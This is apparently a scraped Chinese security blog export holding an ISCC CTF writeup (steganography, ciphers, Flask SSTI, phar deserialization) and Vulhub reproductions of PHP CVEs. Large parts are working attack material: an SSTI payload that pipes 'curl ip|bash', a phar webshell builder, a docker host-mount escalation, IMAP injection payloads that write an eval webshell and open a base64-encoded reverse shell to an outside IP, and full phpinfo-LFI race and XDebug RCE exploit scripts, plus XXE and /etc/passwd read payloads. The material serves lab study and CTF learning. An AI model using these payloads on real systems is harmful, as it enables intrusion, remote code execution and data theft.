123456789s1=&#x27;D3tivtm_zv_Tq5I_Dygef&#x27;s2=&#x27;W3lcome_to_Mi5C_Wryyy&#x27;for i,j in zip(s1,s2): if i not in &quot;0123456789_&quot;: if ord(i)-ord(j)&lt;0: print(i+&#x27; &#x27;+j+&#x27; &#x27;+str(26-ord(j)+ord(i))) else: print(i+&#x27; &#x27;+j+&#x27; &#x27;+str(ord(i)-ord(j)))# 7867循环 最终flag，前面的很像welcome to，实在不行猜也行 1ISCC&#123;W3lcome_to_Mi5C_Wryyy&#125; 寻找小明-1根据最低位的背影.png立马想到了lsb隐写相关的，StegSlove打开，切换不同通道，发现一张二维码 扫出来一个链接，打开发现是 1[257,1,258,2,259,3,260,4,261,5,262,7,263,8,259,277,438,300,455,319,25,300,456,400,66,366,78,300,421,259,452,23] 这是啥呢？ 最终flag: 1flag&#123;ISCC*funny&#125; ISCC成绩查询-1StegSlove打开，发现藏着 沿着路径走得到 1TRLNCHHAFCIEEIEEPR 栅栏密码解密得到flag 1flag&#123;THERAILFENCECIPHER&#125; 神秘组织的邮件-1StegSlove打开，发现有 123雄机富魁雄罡孤捷 勇立雄英贵猛猛勇 发现每个汉字对应36天罡72地煞，试了试发现都是天罡,换成对应的顺序 1234567雄机富魁 天：6 3 11 1雄罡孤捷 天：6 2 13 16勇立雄英 天：5 15 6 9贵猛猛勇 天：10 7 7 5 发现最大数16，最小数为1，想到16进制，所有数减1，转换成16进制，转换成UTF-16 123456789雄机富魁 天：6 3 11 1 52a0雄罡孤捷 天：6 2 13 16 51cf勇立雄英 天：5 15 6 9 4e58贵猛猛勇 天：10 7 7 5 9664\\u52a0\\u51cf\\u4e58\\u9664 UTF-16转换地址：http://www.msxindl.com/tools/unicode16.asp 1flag&#123;加减乘除&#125; 耳听为实查看属性发现副标题是flag,猜测MP3Stego隐写，密码试试flag，得到： 123flag is here！https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1L3cq1CRVhvv6mq8qogq-sAdHc0aQ&#x3D;&#x3D; base64解密得到提取码，下载下来，发现比原来的大，binwalk分离出压缩包，解压得到 flag-RD.wav和ctf-produce.py ctf-produce.py: 1234567891011121314151617181920212223242526272829303132333435import waveimport numpy as npimport os# 读取音频信号f = wave.open(os.path.abspath(&#x27;./flag.wav&#x27;), &#x27;rb&#x27;) # 二进制只读模式，打开音频文件params = f.getparams() # 返回音频参数，元组：声道数，量化位数(byte单位)，采样频率，采样点数，压缩类型，压缩类型的描述nchannels, sampwidth, framerate, nframes=params[:4] # 赋值声道数，量化位数，采样频率，采样点数str = f.readframes(nframes) # 读取采样点数据，字符串类型wave_data = np.fromstring(str, dtype=np.short) # 字符串转换为short类型time = np.arange(0, nframes) * (1.0 / framerate) # 通过采样点数和取样频率计算出每个取样的时间# 语音信号分帧处理wlen = 100 # 帧长inc = 50 # 帧移signal_length = len(wave_data) # 信号总长度if signal_length &lt;= wlen: # 若信号长度小于一个帧的长度，则帧数 nf 定义为1，否则，计算帧的总长度 nf = 1else: nf = int(np.ceil((1.0*signal_length-wlen+inc)/inc))pad_length = int((nf-1)*inc+wlen) # 所有帧加起来总的铺平后的长度zeros = np.zeros((pad_length-signal_length), dtype=int) # 不够的长度使用0填补pad_signal = np.concatenate((wave_data,zeros)) # 填补后的信号记为pad_signalindices = np.tile(np.arange(0,wlen),(nf,1))+np.tile(np.arange(0,nf*inc,inc), (wlen,1)).T # 相当于对所有帧的时间点进行抽取，得到nf*wlen长度的矩阵indices = np.array(indices, dtype=np.int32) # 将indices转化为矩阵indices = np.random.permutation(indices)frames = pad_signal[indices] # 得到帧信号frames = frames.flatten()w = wave.open(os.path.abspath(&#x27;./flag-RD.wav&#x27;), &quot;wb&quot;) # 打开WAV文档# 配置声道数、量化位数和取样频率w.setnchannels(nchannels)w.setsampwidth(sampwidth)w.setframerate(framerate*2) # 采样频率至少是信号频率最高频率的两倍以上才能重新恢复为原来的模拟信号w.writeframes(frames.tostring()) # 将wav_data转换为二进制数据写入文件w.close()f.close() 很明显，需要我们逆推flag.wav了 千层套路一张gif图片，stegslove分离出8张图片，ps拼一下 1sr5#TKh~ck3^ 提交flag发现不对 擂台题webEasy Injectionflask ssti，直接P神的payload反弹shell: 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;curl ip|bash&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; root权限就很奇怪 大黑阔扫目录，发现有源码www.zip upload.php: 1234567891011121314151617181920212223&lt;?php$tmp_file_location=&#x27;/var/www/html/&#x27;;if (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123; echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;]; echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; if (file_exists($tmp_file_location.&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; &#125; else &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $tmp_file_location.&quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in: &quot; .$tmp_file_location. &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125; &#125;else &#123; echo &quot;Invalid file,you can only upload gif&quot;; &#125;?&gt; show.php: 12345678910&lt;?php$filename=$_GET[&#x27;filename&#x27;];class AnyClass&#123; var $output = &#x27;echo &quot;ok&quot;;&#x27;; function __destruct() &#123; eval($this -&gt; output); &#125;&#125;file_exists($filename); 很明显phar反序列化，由于版本是php5.6，可以用assert，所以构造 12345678910111213&lt;?phpclass AnyClass&#123; var $output = &#x27;assert($_POST[1]);&#x27;;&#125;$phar = new Phar(&quot;shell.phar&quot;); //后缀名必须为 phar$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$object = new AnyClass;$phar-&gt;setMetadata($object); //将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 进去之后发现flag在/root/flag.txt,反弹shell,docker提权 123docker pull alpinedocker docker run -id -v /:/tmp alpinedocker exec 68335e7b38e0 cat /tmp/root/flag.txt misc是我DIO哒foremost分离出一张二维码，不知道binwalk为啥不行，扫出来是: 1Useful_Massage_1(SVNDQyU3QmZsQGdfaXN StegSolve分离出第二部分 1Useful_M assage_2(fa09fTjBfRCUyMW9fZGFhYW ElMjFfXyU3RA&#x3D;&#x3D;) 拼接到一块，base64解密并url解码得到flag 1ISCC&#123;fl@g_is_kO_N0_D!o_daaaa!__&#125; Easy_Minecraft下载对应的版本的mc，添加服务器发现： 1key2:Decode(n*Base64_Decode(VlRKR2MyUkhWbXRZTVNzNVRWVkp0VFl3YVdoUmRFNXBNelozYkVKWVJWbE9Za1pKUVV4b00wdDJRU1V6UkElM0QlM0Q%3D)) base64解密一次为： 1VTJGc2RHVmtYMSs5TVVJtTYwaWhRdE5pMzZ3bEJYRVlOYkZJQUxoM0t2QSUzRA&#x3D;&#x3D; 再解密一次 1U2FsdGVkX1+9MUIµ60ihQtNi36wlBXEYNbFIALh3KvA&#x3D; 直接加入服务器会提示： 1ZmxhZ3tJNV90aDFzX2ZsQGc&#x2F;fQ&#x3D;&#x3D; base64解密之后是： 1flag&#123;I5_th1s_fl@g?&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"ISCC","slug":"ISCC","permalink":"http://www.moonback.xyz/tags/ISCC/"}]},{"title":"Vulhub之php","slug":"Vulhub之php","date":"2020-05-05T07:34:06.000Z","updated":"2020-05-06T13:45:28.060Z","comments":true,"path":"2020/05/05/Vulhub之php/","link":"","permalink":"http://www.moonback.xyz/2020/05/05/Vulhub%E4%B9%8Bphp/","excerpt":"本篇博客主要复现了Vulhub上的php部分漏洞！","text":"本篇博客主要复现了Vulhub上的php部分漏洞！ CVE-2012-1823漏洞简介该漏洞可导致代码执行。 WEB 中， Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器 Web Application 一般指PHP、Java、Asp.net等应用程序 cgi： Web Server 与 Web Application 之间数据交换的一种协议 FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。同样，SCGI 协议与 FastCGI 类似 PHP-CGI：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序 PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理 在整个网站架构中，Web Server（如Apache）只是内容的分发者。如果客户端请求的是 index.html，那么Web Server会去文件系统中找到这个文件，发送给浏览器，下图分发的是静态数据。 如果请求的是 index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。 当Web Server收到 index.php 这个请求后，会启动对应的 CGI 程序，这里就是PHP的解析器。接下来PHP解析器会解析php.ini文件，初始化执行环境，然后处理请求，再以规定CGI规定的格式返回处理后的结果，退出进程，Web server再把结果返回给浏览器。这就是一个完整的动态PHP Web访问流程。 更详细的内容参考： https://www.cnblogs.com/zzx-hjl/p/10583849.html https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html 本漏洞只出现在以cgi模式运行的php中，影响版本 php &lt; 5.3.12 or php &lt; 5.4.2。 这个漏洞简单来说，就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。 漏洞复现直接访问一个php文件加上-s就能看到源码 除了-s还有以下参数可用： -c 指定php.ini文件的位置 -n 不要加载php.ini文件 -d 指定配置项 -b 启动fastcgi进程 -T 执行指定次该文件 -h和-? 显示帮助 我们可以构造下面的请求来执行代码： 1234POST:/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input&lt;?php phpinfo(); 这个漏洞被爆出来以后，PHP官方对其进行了修补，发布了新版本5.4.2及5.3.12，但这个修复是不完全的，可以被绕过，进而衍生出CVE-2012-2311漏洞，此时我们可以空格+-绕过。 CVE-2018-19518漏洞简介该漏洞可导致命令执行。 php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。 因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。 漏洞复现漏洞环境关键代码： 12345&lt;?phpif(!empty($_POST)) &#123; $imap = @imap_open(&#x27;&#123;&#x27;.$_POST[&#x27;hostname&#x27;].&#x27;:993/imap/ssl&#125;INBOX&#x27;, $_POST[&#x27;username&#x27;], $_POST[&#x27;password&#x27;]);&#125;?&gt; 该命令执行是无回显的，因此我们可以尝试着写马： 12POST:hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2BJz5tb29uYmFjay5waHA%3D|base64%09-d|sh&#125;&amp;username=111&amp;password=222 其中base64编码是 1echo &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;&gt;moonback.php 或者不用这样麻烦，直接加上;执行命令 12POST:hostname=x+-oProxyCommand%3d;ls&gt;a&#125;&amp;username=111&amp;password=222 反弹shell: 12POST:hostname=x+-oProxyCommand%3decho%09YmFzaCAtaSA%2BJiAvZGV2L3RjcC80Ny45Ny4yMTAuMTQxLzkwMDAgMD4mMQ%3D%3D|base64%09-d|bash&#125;&amp;username=111&amp;password=222 CVE-2019-11043漏洞简介在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。 在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。 利用条件和影响范围： 利用条件以及漏洞影响范围。 1、Nginx + php_fpm，且配置location ~ [^/]\\.php(/|$)会将请求转发到php-fpm。2、Nginx配置fastcgi_split_path_info并且以^开始以$，只有在这种条件下才可以通过换行符来打断正则表达式判断。 ps: 则允许index.php/321 -&gt; index.php 1fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$; 3、fastcgi_param中PATH_INFO会被定义通过fastcgi_param PATH_INFO $fastcgi_path_info;，当然这个变量会在fastcgi_params默认定义。4、在nginx层面没有定义对文件的检查比如try_files $uri =404，如果nginx层面做了文件检查，则请求不会被转发给php-fmp。 nginx配置类似于： 1234567891011121314151617server &#123; listen 80; server_name _; root /usr/share/nginx/html; location ~ [^/]\\.php(/|$) &#123; # try_files $uri =404; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass 172.16.88.3:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_hide_header X-Powered-By; &#125;&#125; 这个漏洞在实际研究过程中对真实世界危害有限，其主要原因都在于大部分的nginx配置中都携带了对文件的检查，且默认的nginx配置不包含这个问题 漏洞复现exp github地址：https://github.com/neex/phuip-fpizdam ubuntu安装go环境，直接用apt安装的是1.6版本，该脚本要求1.13及以上 123sudo add-apt-repository ppa:longsleep/golang-backportssudo apt-get updatesudo apt-get install golang-go 默认项目文件夹是~/go，接着就 1go get github.com/neex/phuip-fpizdam 在~/go/bin下面就能看到编译成功的二进制文件了，跑exp: 然后就可以命令执行了 利用phpinfo包含临时文件漏洞简介该漏洞需要有包含点，并且有phpinfo页面，然后就能getshell，该漏洞与php版本无关 在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。 同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。 在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。 但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。 这个时候就需要用到条件竞争，具体流程如下： 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大 php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell 漏洞复现python2 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#!/usr/bin/pythonimport sysimport threadingimport socketdef setup(host, port): TAG=&quot;Security Test&quot; PAYLOAD=&quot;&quot;&quot;%s\\r&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;)?&gt;\\r&quot;&quot;&quot; % TAG REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot; % PAYLOAD padding=&quot;A&quot; * 5000 REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\\rHTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rHTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r&quot;&quot;&quot; return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = &quot;&quot; while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(&quot;[tmp_name] =&amp;gt; &quot;) fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fncounter=0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print &quot;\\nGot it! Shell created in /tmp/g&quot; self.event.set() except socket.error: returndef getOffset(host, port, phpinforeq): &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = &quot;&quot; while True: i = s.recv(4096) d+=i if i == &quot;&quot;: break # detect the final chunk if i.endswith(&quot;0\\r\\n\\r\\n&quot;): break s.close() i = d.find(&quot;[tmp_name] =&amp;gt; &quot;) if i == -1: raise ValueError(&quot;No php tmp_name in phpinfo output&quot;) print &quot;found %s at %i&quot; % (d[i:i+10],i) # padded up a bit return i+256def main(): print &quot;LFI With PHPInfo()&quot; print &quot;-=&quot; * 30 if len(sys.argv) &lt; 2: print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print &quot;Error with port %d: %s&quot; % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e) sys.exit(1) print &quot;Getting initial offset...&quot;, reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print &quot;Spawning worker pool (%d)...&quot; % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( &quot;\\r% 4d / % 4d&quot; % (counter, maxattempts)) sys.stdout.flush() if counter &gt;= maxattempts: break print if e.is_set(): print &quot;Woot! \\m/&quot; else: print &quot;:(&quot; except KeyboardInterrupt: print &quot;\\nTelling threads to shutdown...&quot; e.set() print &quot;Shuttin&#x27; down...&quot; for t in tp: t.join()if __name__==&quot;__main__&quot;: main() Vulhub上的环境有两个php页面 12phpinfo.phplfi.php XML外部实体注入漏洞漏洞简介该漏洞主要危害：任意文件读取，ssrf libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。 漏洞复现网站目录结构： 1SimpleXMLElement.php dom.php index.php simplexml_load_string.php simplexml_load_string.php： 1234&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$xml = simplexml_load_string($data);echo $xml-&gt;name; SimpleXMLElement.php： 1234&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$xml = new SimpleXMLElement($data);echo $xml-&gt;name; dom.php: 12345&lt;?php$data = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($data);print_r($dom); 我们可以构造读取文件： 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/dom.php&quot; &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; XDebug远程调试漏洞漏洞简介该漏洞可导致代码执行。 XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1，即如下配置： 12xdebug.remote_connect_back &#x3D; 1xdebug.remote_enable &#x3D; 1 这个配置下，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。 漏洞复现因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞 python3 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python3import reimport sysimport timeimport requestsimport argparseimport socketimport base64import binasciifrom concurrent.futures import ThreadPoolExecutorpool = ThreadPoolExecutor(1)session = requests.session()session.headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;&#125;def recv_xml(sock): blocks = [] data = b&#x27;&#x27; while True: try: data = data + sock.recv(1024) except socket.error as e: break if not data: break while data: eop = data.find(b&#x27;\\x00&#x27;) if eop &lt; 0: break blocks.append(data[:eop]) data = data[eop+1:] if len(blocks) &gt;= 4: break return blocks[3]def trigger(url): time.sleep(2) try: session.get(url + &#x27;?XDEBUG_SESSION_START=phpstorm&#x27;, timeout=0.1) except: passif __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;XDebug remote debug code execution.&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, required=True, help=&#x27;the code you want to execute.&#x27;) parser.add_argument(&#x27;-t&#x27;, &#x27;--target&#x27;, required=True, help=&#x27;target url.&#x27;) parser.add_argument(&#x27;-l&#x27;, &#x27;--listen&#x27;, default=9000, type=int, help=&#x27;local port&#x27;) args = parser.parse_args() ip_port = (&#x27;0.0.0.0&#x27;, args.listen) sk = socket.socket() sk.settimeout(10) sk.bind(ip_port) sk.listen(5) pool.submit(trigger, args.target) conn, addr = sk.accept() conn.sendall(b&#x27;&#x27;.join([b&#x27;eval -i 1 -- &#x27;, base64.b64encode(args.code.encode()), b&#x27;\\x00&#x27;])) data = recv_xml(conn) print(&#x27;[+] Recieve data: &#x27; + data.decode()) g = re.search(rb&#x27;&lt;\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]&gt;&#x27;, data, re.I) if not g: print(&#x27;[-] No result...&#x27;) sys.exit(0) data = g.group(1) try: print(&#x27;[+] Result: &#x27; + base64.b64decode(data).decode()) except binascii.Error: print(&#x27;[-] May be not string result...&#x27;) 注意：因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网） CVE-2017-5223漏洞简介该漏洞可导致任意文件读取。 PHPMailer是堪称全球最流行邮件发送类，其全球范围内的用户量大约有900万，被诸多开源项目所采用，包括WordPress、Drupal、1CRM、Joomla!等 PHPMailer在发送邮件的过程中，会在邮件内容中寻找图片标签（&lt;img src=&quot;...&quot;&gt;），并将其src属性的值提取出来作为附件。所以，如果我们能控制部分邮件内容，可以利用&lt;img src=&quot;/etc/passwd&quot;&gt;将文件/etc/passwd作为附件读取出来，造成任意文件读取漏洞。 漏洞复现搭建好环境我们看下源码： index.php: 1234567891011121314151617181920212223242526272829303132&lt;?phprequire &#39;vendor&#x2F;autoload.php&#39;;if (isset($_POST[&#39;your-name&#39;], $_POST[&#39;your-email&#39;], $_POST[&#39;your-message&#39;])) &#123; $mail &#x3D; new PHPMailer(); $mail-&gt;isSMTP(); $mail-&gt;Host &#x3D; $_ENV[&#39;SMTP_SERVER&#39;]; $mail-&gt;SMTPAuth &#x3D; true; $mail-&gt;Username &#x3D; $_ENV[&#39;SMTP_EMAIL&#39;]; $mail-&gt;Password &#x3D; $_ENV[&#39;SMTP_PASSWORD&#39;]; $mail-&gt;Port &#x3D; intval($_ENV[&#39;SMTP_PORT&#39;]); $mail-&gt;CharSet &#x3D; &#39;UTF-8&#39;; if (in_array($_ENV[&#39;SMTP_SECURE&#39;], [&#39;tls&#39;, &#39;ssl&#39;])) &#123; $mail-&gt;SMTPSecure &#x3D; $_ENV[&#39;SMTP_SECURE&#39;]; &#125; else &#123; $mail-&gt;SMTPSecure &#x3D; false; &#125; $message &#x3D; &lt;&lt;&lt;DATA&lt;p&gt;&lt;strong&gt;&#123;$_POST[&#39;your-name&#39;]&#125;&lt;&#x2F;strong&gt;您好，您反馈的意见如下：&lt;&#x2F;p&gt;&lt;blackquote&gt;&#123;$_POST[&#39;your-message&#39;]&#125;&lt;&#x2F;blockquote&gt;&lt;p&gt;我们将在24小时内给予您回复，请耐心等待！&lt;&#x2F;p&gt;DATA; $mail-&gt;SetFrom($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]); $mail-&gt;AddAddress($_POST[&quot;your-email&quot;], $_POST[&quot;your-name&quot;]); $mail-&gt;Subject &#x3D; &quot;您反馈的意见我们已经收到&quot;; $mail-&gt;MsgHTML($message); if(!$mail-&gt;Send()) echo &quot;Error: &quot;.$mail-&gt;ErrorInfo; else echo &quot;Success!&quot;;&#125;?&gt; PHPMailer类在vendor/phpmailer/phpmailer下面 由于自己的是阿里云，好像搭不了邮件服务器，也没复现成功2333… 搭建好的环境如图： “意见反馈”页面，正常用户填写昵称、邮箱、意见提交，这些信息将被后端储存，同时后端会发送一封邮件提示用户意见填写完成。该场景在实战中很常见，比如用户注册网站成功后，通常会收到一封包含自己昵称的通知邮件，那么，我们在昵称中插入恶意代码，目标服务器上的文件将以附件的形式被读取出来。 1&lt;img src=&quot;/etc/passwd&quot;&gt; CVE-2017-9841漏洞简介该漏洞可导致代码执行。 composer是php包管理工具，使用composer安装扩展包将会在当前目录创建一个vendor文件夹，并将所有文件放在其中。通常这个目录需要放在web目录外，使用户不能直接访问。 phpunit是php中的单元测试工具，其4.8.19 ~ 4.8.27和5.0.10 ~ 5.6.2版本的vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php文件有如下代码： 1eval(&#x27;?&gt;&#x27;.file_get_contents(&#x27;php://input&#x27;)); 如果该文件被用户直接访问到，将造成远程代码执行漏洞。 漏洞复现直接将PHP代码作为POST Body发送给 1http://yourip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","categories":[],"tags":[{"name":"Vulhub","slug":"Vulhub","permalink":"http://www.moonback.xyz/tags/Vulhub/"},{"name":"CVE","slug":"CVE","permalink":"http://www.moonback.xyz/tags/CVE/"}]},{"title":"PHP反序列化字符逃逸","slug":"反序列化字符逃逸","date":"2020-04-25T07:40:03.000Z","updated":"2020-04-26T15:05:31.856Z","comments":true,"path":"2020/04/25/反序列化字符逃逸/","link":"","permalink":"http://www.moonback.xyz/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/","excerpt":"本篇博客主要介绍了反序列化字符逃逸的相关内容！","text":"本篇博客主要介绍了反序列化字符逃逸的相关内容！ 什么是反序列化字符逃逸？个人理解：在反序列化之前，存在对序列化字符串的替换等操作，导致可以构造特定的字符串序列达到本来完成不了的操作，比如修改其他变量的值，注入对象。 举个例子： 123456789101112131415&lt;?phpinclude &#x27;flag.php&#x27;;function filter($string)&#123; return str_replace(&#x27;x&#x27;,&#x27;yy&#x27;,$string);&#125;$username = $_GET[&#x27;u&#x27;];$password = &quot;aaa&quot;;$user = array($username, $password);$s = serialize($user);$r = filter($s);$a= unserialize($r);if($a[1]===&#x27;admin&#x27;)&#123; echo $flag;&#125;highlight_file(__FILE__); 